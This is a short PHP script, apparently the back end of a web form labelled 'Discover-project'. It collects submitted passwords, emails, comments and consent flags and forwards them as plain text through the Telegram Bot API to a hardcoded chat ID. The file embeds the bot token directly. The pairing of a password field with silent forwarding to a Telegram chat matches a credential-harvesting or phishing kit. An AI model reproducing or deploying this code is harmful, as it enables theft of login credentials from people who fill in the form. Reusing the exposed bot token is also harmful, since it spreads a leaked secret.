<?php
 
  const TOKEN = '7367612942:AAFI0FQzQZjrFndp0brU65lOVnToSFiEkiA';
 
  const CHATID = '-4138443533';
 
 
if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
  $textSendStatus = '';
   
  /* if (!empty($_POST['password']) && !empty($_POST['policy']) && !empty($_POST['email'])) { */
     
    $txt = "Discover-project%0A";
     
    if (isset($_POST['password']) && !empty($_POST['password'])) {
        $txt .= "Пароль: " . strip_tags(trim(urlencode($_POST['password']))) . "%0A";
    }
     
    if (isset($_POST['policy']) && !empty($_POST['policy'])) {
        $txt .= "Согласие на обработку данных: " . strip_tags(urlencode($_POST['policy'])) . "%0A";
    }

    if (isset($_POST['comment']) && !empty($_POST['comment'])) {
      $txt .= "Коментарий: " . strip_tags(urlencode($_POST['comment'])) . "%0A";
  }

    if (isset($_POST['email']) && !empty($_POST['email'])) {
      $txt .= "E-mail: " . strip_tags(urlencode($_POST['email'])) . "%0A";
    }
 
    $textSendStatus = @file_get_contents('https://api.telegram.org/bot'. TOKEN .'/sendMessage?chat_id=' . CHATID . '&parse_mode=html&text=' . $txt); 
 
  /* } else {
    echo json_encode('NOTVALID');
  } */
} else {
  header("Location: /");
}